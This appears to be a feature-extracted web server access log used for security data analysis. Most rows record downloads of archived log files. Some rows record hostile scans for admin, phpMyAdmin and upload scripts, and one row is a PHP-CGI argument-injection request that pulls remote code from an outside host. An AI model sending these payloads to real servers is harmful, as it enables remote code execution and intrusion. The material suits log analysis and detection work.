32,1,200,0,GET /self.logs/?C=M;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-14.gz HTTP/1.1
23,1,301,0,GET /wp-admin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-09.gz HTTP/1.1
41,1,404,0,GET /apple-touch-icon120x120.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-12.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-02.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-20.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-25.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-12.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-05.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-15.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-30.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-02-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-30.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-11-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-16.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-23.gz HTTP/1.1
25,1,404,0,GET /maccdc2011/ HTTP/1.1
70,3,404,0,GET /community/index.php?app=core&module=global&section=login HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-05.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-04-31.gz HTTP/1.1
23,1,200,0,GET /auth.log/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-30.gz HTTP/1.1
42,1,200,0,GET /maccdc2012/signatures.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-24.gz HTTP/1.1
19,1,301,0,GET /squid HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-15.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-25.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-30.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=D;O=A HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-30.gz HTTP/1.1
21,1,200,0,OPTIONS /tg/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-29.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-22.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-04.gz HTTP/1.1
25,1,200,0,GET /favicon.ico HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-19.gz HTTP/1.1
39,1,404,0,HEAD /editors/fckeditor/editor HTTP/1.1
27,1,404,0,GET /administrator HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-30.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-27.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=D HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-02.gz HTTP/1.1
48,1,404,0,GET /bootstrap/img/apple-touch-icon.png HTTP/1.1
33,1,404,0,HEAD /js/mage/cookies.js HTTP/1.1
40,1,404,0,GET /apple-touch-icon-76x76.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-05.gz HTTP/1.1
44,1,404,0,GET //wp-content/plugins/ubh/up.php HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-01-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-23.gz HTTP/1.1
25,1,418,0,GET //xmlrpc.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-01.gz HTTP/1.1
112,1,200,0,GET /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://www.transwareag.com/media/jce/tio.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-04.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=S;O=A HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-18.gz HTTP/1.1
32,1,404,1,GET /honeypot/BSidesDFW HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-18.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-10-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-22.gz HTTP/1.1
41,1,200,0,GET /googleb1a7c9cf768c32be.html HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-02.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.0
35,1,200,0,GET /maccdc2012/ftp.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-14.gz HTTP/1.1
22,1,404,0,GET /wp-admin HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-29.gz HTTP/1.1
32,1,404,0,GET /zeus/zeus_json.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-13.gz HTTP/1.1
37,1,404,1,GET /mysql/scripts/setup.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-09.gz HTTP/1.1
61,1,404,1,POST /honeypot/BSidesDFW%20-%202014.ipynb/trackback/ HTTP/1.1
53,1,404,0,GET //wp-includes/registration-functions.php HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2016-05-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-04.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-24.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-12.gz HTTP/1.1
42,1,404,0,GET /apple-touch-icon-152x152.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-07.gz HTTP/1.1
20,1,404,1,GET /mysql/ HTTP/1.1
23,1,200,1,GET /honeypot/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-01.gz HTTP/1.1
54,1,404,0,GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-23.gz HTTP/1.1
20,1,404,0,GET /admin/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-14.gz HTTP/1.1
195,4,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf&amp;sa=U&amp;ved=0ahUKEwjfjZHj8IrRAhXjlFQKHfUVA2QQFgiXAjA3&amp;usg=AFQjCNECd9WKWE5QQr2RPFKoA-ce5IW95w//write.php?dir=remote?? HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-15.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-02-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-20.gz HTTP/1.1
50,1,404,0,GET /phpmyadmin/scripts/db_setup.init.php HTTP/1.1
46,1,404,1,GET /honeypot/mysql/scripts/setup.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-22.gz HTTP/1.1
19,1,404,0,GET /data# HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-27.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-12.gz HTTP/1.1
36,1,200,1,GET /self.logs/?C=D%3BO%3DA HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-12.gz HTTP/1.1
25,1,200,0,GET /squid/zeus/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-05.gz HTTP/1.1
70,1,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf' HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-23.gz HTTP/1.1
25,1,200,0,GET /maccdc2012/ HTTP/1.1
38,1,404,0,GET /access.log.2015-03-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-28.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-27.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-09-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-14.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-03-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-22.gz HTTP/1.1
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0
49,1,200,1,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-29.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-29.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-10.gz HTTP/1.1
49,1,200,0,GET /maccdc2012/maccdc2012_full_alert.7z HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-14.gz HTTP/1.1
43,1,301,0,HEAD /media/system/css/mootree.css HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-11.gz HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_2/http.log.zip HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-22.gz HTTP/1.1
22,1,301,0,GET /auth.log HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-27.gz HTTP/1.1
